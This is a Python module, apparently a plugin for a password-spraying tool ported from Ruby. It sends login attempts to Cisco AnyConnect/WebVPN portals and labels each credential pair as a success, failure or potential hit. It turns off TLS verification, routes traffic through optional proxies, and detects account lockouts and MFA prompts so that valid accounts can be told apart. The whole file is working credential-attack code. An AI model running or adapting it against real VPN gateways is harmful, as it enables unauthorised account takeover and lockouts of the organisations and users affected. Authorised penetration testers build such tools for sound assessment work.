import re
import requests
from urllib.parse import urlparse, quote_plus
import utils.utils as utils

# Deliberately disable warnings since verify=False is intended in pen-test contexts
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)


def ciscovpn_authenticate(target_url, username, password, useragent, pluginargs):
    """
    Attempts a Cisco AnyConnect / WebVPN web-auth POST to the /+webvpn+/index.html endpoint.
    Returns a dict with keys:
      - result: "success" | "failure" | "potential"
      - error: bool
      - output: human-readable summary
      - valid_user: bool
      - locked_out: bool
      - mfa: bool

    pluginargs: expected to be a dict, may contain:
      - "proxy": proxies dict for requests (optional)
      - any custom headers will be added via utils.add_custom_headers
    """

    data_response = {
        "result": None,
        "error": False,
        "output": "",
        "valid_user": False,
        "locked_out": False,
        "mfa": False
    }

    try:
        parsed = urlparse(target_url)
        scheme = parsed.scheme or "https"
        netloc = parsed.netloc
        base = f"{scheme}://{netloc}"
        # preserve any path prefix from the target (Ruby did this: "/<pathprefix>/<path>")
        path_prefix = parsed.path.rstrip("/") if parsed.path and parsed.path != "/" else ""
        post_path = "/+webvpn+/index.html"
        post_url = f"{base}{path_prefix}{post_path}"

        # Basic headers similar to the Ruby code
        headers = {
            "User-Agent": useragent,
            "Cookie": "webvpnlogin=1;",  # the Ruby code required this
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "application/x-www-form-urlencoded",
            "Origin": base,
            "Referer": post_url
        }

        # allow caller to inject/override headers
        headers = utils.add_custom_headers(pluginargs, headers)

        # form payload — follow Ruby encoding of fields
        # Use quote_plus for single-value encoding; Ruby used URI.encode_www_form on each param
        domain = "" # TODO make this an argument
        group_list_val = quote_plus(domain or "")
        form = (
            f"tgroup=&next=&tgcookieset=&group_list={group_list_val}"
            f"&username={quote_plus(username)}&password={quote_plus(password)}&Login=Login"
        )

        proxies = pluginargs.get("proxy") if isinstance(pluginargs, dict) else None

        with requests.Session() as s:
            s.verify = False  # intentionally disabled for pen-test parity
            # send POST directly (the Ruby code did not do a prior GET)
            resp = s.post(post_url, headers=headers, data=form, verify=False,
                          proxies=proxies, timeout=15, allow_redirects=True)

        # default assumption
        data_response["result"] = "failure"
        data_response["output"] = f"[-] FAILURE: HTTP {resp.status_code} => {username}:{password}"

        body = resp.text or ""

        # If status code is not 200 treat as "potential" (like the example)
        if resp.status_code and resp.status_code != 200:
            data_response["result"] = "potential"
            data_response["output"] = f"[~] POTENTIAL: HTTP {resp.status_code} => {username}:{password}"

        # Heuristic checks based on body content (from Ruby comments + common Cisco messages)
        # Ruby considered valid when 200 and body does NOT include "/+CSCOE+/logon.html"
        if resp.status_code == 200 and ("/+CSCOE+/logon.html" not in body):
            data_response["result"] = "success"
            data_response["valid_user"] = True
            data_response["output"] = f"[+] SUCCESS: => {username}:{password}"

        # Detect lockout phrases
        if re.search(r"account (?:is )?locked|too many attempts|temporarily locked", body, re.IGNORECASE):
            data_response["locked_out"] = True
            # escalate result if it wasn't already success
            if not data_response["valid_user"]:
                data_response["result"] = data_response["result"] or "potential"
            data_response["output"] += " | Account appears locked."

        # Detect MFA prompt phrases (simple heuristics)
        if re.search(r"multi-?factor|two-?factor|mfa|second.*factor|authenticate with your phone", body, re.IGNORECASE):
            data_response["mfa"] = True
            # if MFA is required we can't call it a straight success even if username is known
            if data_response["valid_user"]:
                data_response["result"] = "potential"
                data_response["output"] = f"[~] POTENTIAL (MFA required): => {username}:{password}"
            else:
                data_response["output"] += " | MFA challenge detected."

        # Some informative strings Cisco sometimes returns
        if "Invalid username or password" in body or "Login failed" in body or "authentication failed" in body.lower():
            # explicit failure message
            data_response["output"] = f"[-] FAILURE: Authentication failed => {username}:{password}"
            data_response["result"] = "failure"
            data_response["valid_user"] = False

        # If status code is 200 but we still haven't marked success, and body contains suspicious indicators,
        # keep it as potential and include the body snippet for debugging
        if data_response["result"] == "potential":
            snippet = body[:500].replace("\n", " ")
            data_response["output"] += f" | Response snippet: {snippet}"

    except Exception as ex:
        data_response["error"] = True
        data_response["output"] = f"[!] EXCEPTION: {repr(ex)}"

    return data_response
